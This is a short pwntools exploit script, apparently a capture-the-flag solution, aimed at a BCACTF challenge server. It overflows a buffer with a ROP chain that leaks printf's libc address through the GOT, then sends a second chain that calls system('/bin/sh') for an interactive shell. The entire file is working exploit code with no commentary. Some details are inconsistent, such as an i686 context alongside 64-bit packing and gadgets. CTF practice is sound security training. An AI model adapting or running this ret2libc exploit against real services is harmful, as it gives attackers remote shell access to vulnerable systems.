from pwn import *
context.update(os="linux", arch="i686")
p = remote("bin.bcactf.com", 49159)

# Stage 1

PRINTF_PLT = p64(0x401140)
POP_RDI = p64(0x00401703 )
RETN = p64(0x401704)
MAIN = p64(0x4012B6)

la = p64(0x404038) # printf@.got.plt
LEAK_PAYLOAD = ("A" * 100 + "CCCCCCCCBBBBCCCCCCCC").encode("ASCII") + RETN + POP_RDI + la + PRINTF_PLT + RETN + MAIN

p.recvuntil("Search for: ")
p.sendline(LEAK_PAYLOAD)
p.recvuntil("-------[ end of note data ]-------\n")
d = p.recv(32768)
d = d.replace(b".Search for: ", b"")
d = d.replace(b"Search for: ", b"")
print(d)
x = int.from_bytes(d, "little")
printf_libc = x
printf_libc_file_offset = 	0x064e10
libc = x - printf_libc_file_offset
print(hex(x))
print(hex(printf_libc))
print(hex(printf_libc_file_offset))
print(hex(libc))
print("Success leaking the data")

# Stage 2

SYSTEM = 	p64(0x055410 + libc)
BIN_SH_STRING = 	p64(0x1b75aa + libc)

SHELL_PAYLOAD = ("A" * 100 + "CCCCCCCCBBBBCCCCCCCC").encode("ASCII") + RETN + POP_RDI + BIN_SH_STRING + SYSTEM + RETN + MAIN
p.sendline(SHELL_PAYLOAD)
p.interactive()
p.recvuntil("Search for: ")